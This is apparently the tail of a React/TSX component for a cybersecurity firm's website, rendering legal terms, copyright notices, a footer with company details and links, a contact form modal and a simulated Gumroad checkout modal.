                  { title: "4. API Usage", body: "API access is subject to rate limits defined in your subscription tier. Abuse of rate limits, credential sharing, or reverse engineering of API endpoints constitutes a breach of these Terms and may result in immediate account suspension." },
                  { title: "5. Security Research Disclosure", body: "We support responsible disclosure. Security researchers discovering vulnerabilities in our platforms should report via bivash@cyberdudebivash.com with a 90-day coordinated disclosure timeline. We do NOT authorize unauthorized penetration testing of our production systems." },
                  { title: "6. Limitation of Liability", body: "CyberDudeBivash provides threat intelligence and security tooling on an 'as-is' basis. We are not liable for decisions made based on our intelligence outputs. Maximum aggregate liability shall not exceed the fees paid in the 3 months preceding the claim." },
                  { title: "7. Governing Law", body: "These Terms are governed by the laws of India. Disputes shall be resolved by binding arbitration under the Arbitration and Conciliation Act 1996, with seat of arbitration at Bhubaneswar, Odisha, India." },
                ].map(s => (
                  <div key={s.title} className="border-l-2 border-slate-700 pl-4">
                    <h3 className="text-sm font-bold text-slate-200 mb-1.5">{s.title}</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{s.body}</p>
                  </div>
                ))}
              </div>
            )}

            {currentView === "copyright" && (
              <div className="space-y-8">
                <div>
                  <div className="text-[10px] font-mono text-amber-400 uppercase tracking-widest mb-2">Legal</div>
                  <h1 className="text-2xl font-bold text-white mb-2">Copyright & Intellectual Property</h1>
                  <p className="text-xs text-slate-500 font-mono">© {new Date().getFullYear()} CyberDudeBivash Private Limited. All rights reserved.</p>
                </div>
                <div className="bg-amber-950/20 border border-amber-800/30 rounded-xl p-5">
                  <h3 className="text-sm font-bold text-amber-400 mb-3">Copyright Notice</h3>
                  <p className="text-xs text-slate-300 leading-relaxed font-sans">All content, software, tools, SIGMA rules, playbooks, AI models, threat intelligence feeds, documentation, graphics, brand assets, and other materials published across the CYBERDUDEBIVASH ecosystem are protected under the Copyright Act, 1957 (India) and applicable international copyright treaties including the Berne Convention.</p>
                </div>
                {[
                  { title: "Trademarks", body: "CyberDudeBivash®, Sentinel APEX™, ThreatCore™, GE-Neural Architecture™, and the CyberDudeBivash shield logo are registered/common law trademarks of CYBERDUDEBIVASH PRIVATE LIMITED in India. Unauthorized use of these marks in commerce is prohibited under the Trade Marks Act, 1999." },
                  { title: "Software License", body: "Platform software is proprietary. No part may be copied, modified, distributed, or reverse engineered without written permission. Security tools sold via Gumroad are licensed for single-organization use only and may not be resold or redistributed." },
                  { title: "SIGMA Rules & Playbooks", body: "SIGMA detection rules and incident response playbooks produced by CyberDudeBivash are licensed for defensive use within your own organization only. Attribution required for public sharing: 'Source: CyberDudeBivash® (cyberdudebivash.com)'." },
                  { title: "Permitted Uses", body: "Personal research and educational reference with attribution; linking to our public platforms; quoting brief excerpts for commentary with attribution; using our public API feeds per API Terms. All other uses require written permission." },
                  { title: "DMCA / Takedown", body: "To report copyright infringement or submit a takedown request, contact: bivash@cyberdudebivash.com with subject 'IP Infringement Notice'. We will respond within 5 business days." },
                  { title: "Recommended Attribution", body: "When citing CyberDudeBivash research or tools: 'CyberDudeBivash® (cyberdudebivash.com), [Year]. [Title/Resource]. CYBERDUDEBIVASH PRIVATE LIMITED, Jajpur Road, Odisha, India.'" },
                ].map(s => (
                  <div key={s.title} className="border-l-2 border-amber-800/50 pl-4">
                    <h3 className="text-sm font-bold text-slate-200 mb-1.5">{s.title}</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{s.body}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* 5. BOTTOM ECOSYSTEM FOOTER BAR */}
      <footer className="relative bg-[#020810] border-t-0 overflow-hidden">
        {/* Top gradient accent border */}
        <div className="h-px w-full bg-gradient-to-r from-transparent via-cyan-500/60 to-transparent" />
        <div className="h-px w-full bg-gradient-to-r from-transparent via-cyan-900/40 to-transparent mb-0" />

        {/* Trust badge strip */}
        <div className="bg-[#050c14] border-b border-slate-800/60 py-3 px-6">
          <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-center gap-x-6 gap-y-2">
            {[
              { label: "ISO/IEC 27001:2022", color: "text-cyan-400" },
              { label: "SOC 2 Type II", color: "text-emerald-400" },
              { label: "GDPR Compliant", color: "text-sky-400" },
              { label: "PCI-DSS v4.0", color: "text-violet-400" },
              { label: "India DPDP Act 2023", color: "text-amber-400" },
              { label: "MITRE ATT&CK Mapped", color: "text-red-400" },
              { label: "OWASP LLM Top 10", color: "text-pink-400" },
            ].map(b => (
              <span key={b.label} className={`text-[10px] font-mono font-semibold ${b.color} flex items-center gap-1.5 opacity-80 hover:opacity-100 transition-opacity`}>
                <span className={`w-1.5 h-1.5 rounded-full ${b.color.replace("text-", "bg-")} opacity-80`} />
                {b.label}
              </span>
            ))}
          </div>
        </div>

        {/* Main footer grid */}
        <div className="max-w-7xl mx-auto px-6 pt-10 pb-8 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">

          {/* Brand column */}
          <div className="lg:col-span-2 space-y-4">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-lg bg-gradient-to-br from-cyan-500 to-cyan-700 flex items-center justify-center shadow-lg shadow-cyan-900/50">
                <span className="text-white font-black text-sm">C</span>
              </div>
              <div>
                <div className="text-sm font-bold text-white tracking-wide">CyberDudeBivash<span className="text-cyan-400">®</span></div>
                <div className="text-[9px] text-slate-500 font-mono tracking-widest uppercase">ECOSYSTEM V4 · EST. 2020</div>
              </div>
            </div>
            <p className="text-[12px] text-slate-400 leading-relaxed font-sans max-w-xs">
              Autonomous AI-powered cybersecurity defense platform delivering real-time threat intelligence, managed SOC auditing, and 100+ security tools to enterprise teams globally.
            </p>
            {/* Legal registration */}
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-lg p-3 space-y-1.5">
              <div className="text-[9px] font-bold text-slate-500 uppercase tracking-widest mb-2">Legal Registration</div>
              <div className="text-[11px] text-slate-300 font-mono">CYBERDUDEBIVASH PRIVATE LIMITED</div>
              <div className="flex flex-wrap gap-x-4 gap-y-1">
                <span className="text-[10px] text-slate-500 font-mono">PAN: <span className="text-cyan-400">ARKPN8270G</span></span>
                <span className="text-[10px] text-slate-500 font-mono">GSTIN: <span className="text-cyan-400">21ARKPN8270G1ZP</span></span>
              </div>
              <div className="text-[10px] text-slate-500 font-sans leading-relaxed">
                29, Korai-Sukinda Rd, Ragadi, Jajpur Road, Odisha 755019, India
              </div>
              <a href="tel:+918179881447" className="text-[11px] font-mono text-cyan-400 hover:text-cyan-300 transition-colors flex items-center gap-1.5 pt-0.5">
                <Phone className="w-3 h-3" /> +91 81798 81447
              </a>
              <a href="mailto:bivash@cyberdudebivash.com" className="text-[11px] font-mono text-cyan-400/80 hover:text-cyan-300 transition-colors block">
                bivash@cyberdudebivash.com
              </a>
            </div>
          </div>

          {/* Workspace links */}
          <div className="space-y-3">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-cyan-500 border-b border-slate-800 pb-2">Workspace</h4>
            <ul className="space-y-2">
              {[
                { label: "Gateway", view: "home" as const },
                { label: "Sentinel APEX™", view: "intel" as const },
                { label: "AI Hub & Audit", view: "ai" as const },
                { label: "ThreatCore™ Tools", view: "tools" as const },
                { label: "Blog & Academy", view: "blog" as const },
                { label: "REST API", view: "api" as const },
              ].map(l => (
                <li key={l.view}>
                  <button onClick={() => setCurrentView(l.view)} className="text-[12px] text-slate-400 hover:text-cyan-400 transition-colors cursor-pointer text-left font-sans flex items-center gap-2 group">
                    <span className="w-1 h-1 rounded-full bg-slate-700 group-hover:bg-cyan-400 transition-colors" />
                    {l.label}
                  </button>
                </li>
              ))}
            </ul>
          </div>

          {/* Live platforms */}
          <div className="space-y-3">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-emerald-500 border-b border-slate-800 pb-2">Live Platforms</h4>
            <ul className="space-y-2">
              {[
                { label: "Official Gateway", url: "https://www.cyberdudebivash.com" },
                { label: "Sentinel APEX™", url: "https://intel.cyberdudebivash.com" },
                { label: "AI Security Hub", url: "https://cyberdudebivash.in" },
                { label: "ThreatCore™ Tools", url: "https://tools.cyberdudebivash.com" },
                { label: "Research Blog", url: "https://blog.cyberdudebivash.in" },
                { label: "Developer APIs", url: "https://cyberdudebivash.in/api" },
              ].map(l => (
                <li key={l.url}>
                  <a href={l.url} target="_blank" rel="noopener noreferrer" className="text-[12px] text-slate-400 hover:text-emerald-400 transition-colors font-sans flex items-center gap-2 group">
                    <span className="w-1 h-1 rounded-full bg-slate-700 group-hover:bg-emerald-400 transition-colors" />
                    {l.label}
                  </a>
                </li>
              ))}
            </ul>
          </div>

          {/* Enterprise & legal */}
          <div className="space-y-3">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-violet-400 border-b border-slate-800 pb-2">Enterprise</h4>
            <ul className="space-y-2">
              {[
                "Managed SOC-as-a-Service",
                "DPDP Act Compliance Scans",
                "OWASP LLM Red Team",
                "Multi-Tenant MSSP Suite",
                "vCISO Advisory",
                "Penetration Testing",
              ].map(s => (
                <li key={s} className="text-[11px] text-slate-400 font-sans flex items-start gap-2">
                  <span className="w-1 h-1 rounded-full bg-violet-500/60 mt-1.5 shrink-0" />
                  {s}
                </li>
              ))}
            </ul>
            <div className="pt-2 space-y-1.5">
              <h4 className="text-[10px] font-bold uppercase tracking-widest text-slate-500 border-b border-slate-800/60 pb-2">Legal</h4>
              {[
                { label: "About Us", view: "about" as const },
                { label: "Privacy Policy", view: "privacy" as const },
                { label: "Terms of Service", view: "terms" as const },
                { label: "Copyright & IP", view: "copyright" as const },
              ].map(l => (
                <button key={l.label} onClick={() => setCurrentView(l.view)} className="block text-[11px] text-slate-500 hover:text-slate-300 transition-colors cursor-pointer text-left font-sans">
                  {l.label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Social row */}
        <div className="border-t border-slate-800/60 bg-[#030912]">
          <div className="max-w-7xl mx-auto px-6 py-4 flex flex-wrap items-center justify-between gap-4">
            <div className="flex flex-wrap gap-3">
              {[
                { label: "LinkedIn", url: "https://linkedin.com/company/cyberdudebivash", color: "hover:text-sky-400" },
                { label: "X / Twitter", url: "https://twitter.com/CDBSENTINELAPEX", color: "hover:text-slate-200" },
                { label: "Instagram", url: "https://instagram.com/cyberdudebivash_official", color: "hover:text-pink-400" },
                { label: "YouTube", url: "https://youtube.com/@CYBERDUDEBIVASHSentinelAPEX", color: "hover:text-red-400" },
                { label: "Medium", url: "https://medium.com/@cyberdudebivash", color: "hover:text-emerald-400" },
                { label: "GitHub", url: "https://github.com/cyberdudebivash", color: "hover:text-violet-400" },
              ].map(s => (
                <a key={s.label} href={s.url} target="_blank" rel="noopener noreferrer"
                  className={`text-[11px] text-slate-500 ${s.color} transition-colors font-sans`}>
                  {s.label}
                </a>
              ))}
            </div>
            <div className="flex items-center gap-3 text-[10px] text-slate-600 font-mono">
              <span className="flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                Secure Engine v4.1
              </span>
              <span className="text-slate-700">|</span>
              <span>NODE: 103.142.12.98</span>
            </div>
          </div>
        </div>

        {/* Bottom bar */}
        <div className="bg-black border-t border-slate-900">
          <div className="max-w-7xl mx-auto px-6 py-3 flex flex-col sm:flex-row items-center justify-between gap-2 text-center">
            <div className="text-[10px] text-slate-600 font-mono">
              &copy; {new Date().getFullYear()} CyberDudeBivash Private Limited. All rights reserved.
              &nbsp;&bull;&nbsp;TLP:CLEAR unless otherwise marked.
              &nbsp;&bull;&nbsp;Registered in India under Companies Act 2013.
            </div>
            <div className="text-[10px] text-slate-700 font-mono">SESSION: APEX-9922-BIVASH</div>
          </div>
        </div>
      </footer>

      {/* 6. GENERAL REQUEST ENTRY / LEAD MODAL */}
      {showContactModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm">
          <div className="bg-[#0c1117] border border-slate-800 rounded-lg max-w-md w-full overflow-hidden shadow-2xl">
            <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex justify-between items-center">
              <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Briefcase className="w-4.5 h-4.5 text-cyan-500" />
                CyberDudeBivash® Enterprise Request
              </h3>
              <button 
                onClick={() => setShowContactModal(false)}
                className="text-slate-500 hover:text-slate-300 font-mono text-sm p-1"
              >
                [X]
              </button>
            </div>

            <div className="p-6">
              {contactSubmitted ? (
                <div className="text-center py-6 space-y-3 animate-fade-in">
                  <CheckCircle2 className="w-12 h-12 text-emerald-500 mx-auto animate-bounce" />
                  <h4 className="text-slate-200 font-bold text-sm">Enterprise Inquiry Transmitted</h4>
                  <p className="text-xs text-slate-400 max-w-xs mx-auto font-sans leading-relaxed">
                    A Sentinel Security Coordinator from CyberDudeBivash® (Odisha, India) will review your payload coordinates and reach back via secured email channels.
                  </p>
                </div>
              ) : (
                <form onSubmit={handleContactSubmit} className="space-y-4">
                  <p className="text-xs text-slate-400 leading-normal font-sans">
                    Submit your organization coordinates below to request managed cloud HSM backups, physical SOC tokens, or India DPDP automation services.
                  </p>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Full Name</label>
                    <input 
                      type="text" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.name}
                      onChange={(e) => setContactForm({...contactForm, name: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Secure Business Email</label>
                    <input 
                      type="email" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.email}
                      onChange={(e) => setContactForm({...contactForm, email: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Company / Agency Name</label>
                    <input 
                      type="text" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.company}
                      onChange={(e) => setContactForm({...contactForm, company: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Requirement Overview</label>
                    <textarea 
                      required
                      rows={3}
                      placeholder="E.g. On-premises Sentinel Threat Detection node..."
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500 resize-none font-sans"
                      value={contactForm.message}
                      onChange={(e) => setContactForm({...contactForm, message: e.target.value})}
                    />
                  </div>
                  <button 
                    type="submit"
                    className="w-full bg-cyan-500 hover:bg-cyan-400 text-black py-2.5 rounded font-bold text-xs uppercase tracking-wider mt-2 transition-all cursor-pointer"
                  >
                    Transmit Secured Request
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 7. INTERACTIVE CHECKOUT MODAL (Gumroad simulator) */}
      {checkoutModalOpen && checkingOutProduct && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm">
          <div className="bg-[#0c1117] border border-slate-800 rounded-lg max-w-md w-full overflow-hidden shadow-2xl animate-fade-in">
            <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex justify-between items-center">
              <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Download className="w-4 h-4 text-emerald-400" />
                Gumroad Checkout Core
              </h3>
              <button 
                onClick={() => setCheckoutModalOpen(false)}
                className="text-slate-500 hover:text-slate-300 font-mono text-sm p-1"
              >
                [X]
              </button>
            </div>

            <div className="p-6 space-y-4">
              {checkoutSubmitted ? (
                <div className="text-center py-6 space-y-3">
                  <CheckSquare className="w-12 h-12 text-emerald-500 mx-auto animate-bounce" />
                  <h4 className="text-slate-200 font-bold text-sm">Download Ready!</h4>
                  <p className="text-xs text-slate-400 max-w-xs mx-auto leading-relaxed font-sans">
                    Your payment was verified. The package `{checkingOutProduct.title}` has been registered to your profile. Click Download below to save your defense asset.
                  </p>
                  <div className="pt-2">
                    <button 
                      type="button"
                      onClick={() => {
                        setPurchasedProduct(checkingOutProduct.id);
                        setCheckoutModalOpen(false);
                      }}
                      className="bg-emerald-500 hover:bg-emerald-400 text-black font-extrabold text-xs uppercase py-2 px-6 rounded"
                    >
                      Download Asset (.ZIP)
                    </button>
                  </div>
                </div>
              ) : (
                <form onSubmit={handleCheckoutSubmit} className="space-y-4">
                  <div className="bg-slate-950 p-4 rounded border border-slate-900 space-y-1">
                    <span className="text-[9px] font-mono text-slate-500 uppercase">Selected Asset</span>
                    <h4 className="text-xs font-bold text-slate-200">{checkingOutProduct.title}</h4>
                    <div className="text-xs font-bold text-emerald-400 font-mono pt-1">{checkingOutProduct.price}</div>
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] uppercase font-mono text-slate-500">Receipt Email</label>
                    <input 
                      type="email" 
                      required
                      placeholder="you@domain.com"
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] uppercase font-mono text-slate-500">Secure Payment Channel</label>
                    <div className="grid grid-cols-3 gap-2">
                      <button
                        type="button"
                        onClick={() => setPaymentOption("upi")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "upi" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        UPI / GPay
                      </button>
                      <button
                        type="button"
                        onClick={() => setPaymentOption("card")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "card" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        Card / Net
                      </button>
                      <button
                        type="button"
                        onClick={() => setPaymentOption("crypto")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "crypto" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        USDT / Crypto
                      </button>
                    </div>
                  </div>

                  {paymentOption === "upi" && (
                    <div className="bg-slate-950/80 border border-slate-900 rounded p-3 text-center space-y-1.5 font-mono text-[10px]">
                      <div className="text-slate-400">UPI ID: <span className="font-bold text-slate-200">bivash@cyberdudebivash.com</span></div>
                      <div className="text-slate-500">Scan BHIM, PhonePe, Paytm, or GPay QR code at checkout to process instantly.</div>
                    </div>
                  )}

                  <button 
                    type="submit"
                    className="w-full bg-emerald-500 hover:bg-emerald-400 text-black py-2.5 rounded font-extrabold text-xs uppercase tracking-wider transition-all"
                  >
                    Confirm Secure Payment
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
